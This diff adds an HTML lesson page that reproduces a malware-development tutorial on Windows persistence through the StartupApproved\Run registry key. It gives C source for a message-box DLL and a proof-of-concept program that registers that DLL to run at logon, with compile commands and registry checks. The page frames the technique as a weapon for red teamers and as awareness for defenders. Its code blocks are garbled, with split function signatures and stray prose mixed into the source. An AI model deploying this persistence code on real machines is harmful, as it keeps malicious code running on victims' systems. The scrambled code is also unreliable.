@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Malware development: persistence - part 24. StartupApproved.</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #46</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Malware development: persistence - part 24. StartupApproved.</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Simple C example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is based on my own research into one of the another interesting malware persistence tricks: via StartupApproved Registry key. StartupApproved The very first post in the series about persistence, I wrote about one of the most popular and already classic techniques, via Registry Run keys. An uncommon Registry entry utilized by the standard “startup” process (i.e., the one mostly controlled by Windows Explorer, such as the Run and RunOnce keys, the Startup folder, etc.) after userinit.exe completes its operation, is located at the following location in the Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run Turns out, this key is populated when entries are enabled or disabled via the Windows Task Manager’s Startup tab:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The good news is that we can use this registry path for persistence.</p>
+
+            <div id="practical-example" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">First of all, check Registry keys by the following command: reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">At the next step, as usually, create our “evil” application (hack.c):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.c
+simple DLL messagebox
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
+
+*/
+#include &lt;windows.h&gt;
+BOOL APIENTRY DllMain(HMODULE hModule,
+switch (nReason) {
+case DLL_PROCESS_ATTACH:
+MessageBox(
+NULL,
+"Meow-meow!",
+"=^..^=",
+MB_OK
+);
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+}
+
+DWORD
+
+nReason, LPVOID lpReserved) {
+
+As usually, just meow-meow messagebox.
+
+Then we just modifying our HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">registry key, like this (pers.c):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.c
+windows persistence
+via StartupApproved
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2024/03/12/malware-pers-24.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+BYTE data[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00};
+const char* path =
+"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\
+
+StartupApproved\\Run";
+const char* evil = "Z:\\2024-03-12-malware-pers-24\\hack.dll";
+LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) path, 0, KEY_WRITE,
+&amp;hkey);
+printf (res != ERROR_SUCCESS ? "failed open registry key :(\n" :
+"successfully open registry key :)\n");
+res = RegSetValueEx(hkey, (LPCSTR)evil, 0, REG_BINARY, data, sizeof(data));
+printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" :
+"successfully set registry value :)\n");
+// close the registry key
+RegCloseKey(hkey);
+return 0;
+}
+As you can the the logic of our Proof of Concept is pretty simple - we set the value of
+the registry entry to 0x02 0x00... binary value.
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. First of all, compile our “malware” DLL: x86_64-w64-mingw32-g++ -shared -o hack.dll hack.c -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, compile our PoC: x86_64-w64-mingw32-g++ -O2 pers.c -o pers.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections \ -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, run it on the victim’s machine. In my case, for Windows 10 x64 v1903 VM, it is looks like this: .\pers.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, I also checked registry again: reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved" /s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, logout and login again:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">But unexpectedly it didn’t work for me… Then, I just update the name of entry:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Logout and login, little bit wait…. and it’s worked perfectly….</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So I updated one line in my script:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+pers.c
+windows persistence
+via StartupApproved
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2024/03/12/malware-pers-24.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+int main(int argc, char* argv[]) {
+HKEY hkey = NULL;
+
+BYTE data[] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00};
+const char* path =
+"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\
+StartupApproved\\Run";
+const char* evil = "C:\\temp\\hack.dll";
+LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) path, 0, KEY_WRITE,
+&amp;hkey);
+printf (res != ERROR_SUCCESS ? "failed open registry key :(\n" :
+"successfully open registry key :)\n");
+res = RegSetValueEx(hkey, (LPCSTR)evil, 0, REG_BINARY, data, sizeof(data));
+printf(res != ERROR_SUCCESS ? "failed to set registry value :(\n" :
+"successfully set registry value :)\n");
+// close the registry key
+RegCloseKey(hkey);
+return 0;
+}
+But there is a caveat. Sometimes when I tested this feature, it launched like Skype for
+me:
+
+As you can see, everything worked perfectly as expected! =.. = :)
+This technique is used by APT groups like APT28, APT29, Kimsuky and APT33 in the
+wild. In all honesty, this method is widely employed and widespread due to its extreme
+convenience in deceiving the victims.
+I hope this post spreads awareness to the blue teamers of this interesting technique, and
+adds a weapon to the red teamers arsenal.
+ATT&amp;CK MITRE: T1547.001
+Malware persistence: part 1
+APT28
+APT29
+Kimsuky
+APT33
+source code in github</code></pre>
+            </div></main></body></html>
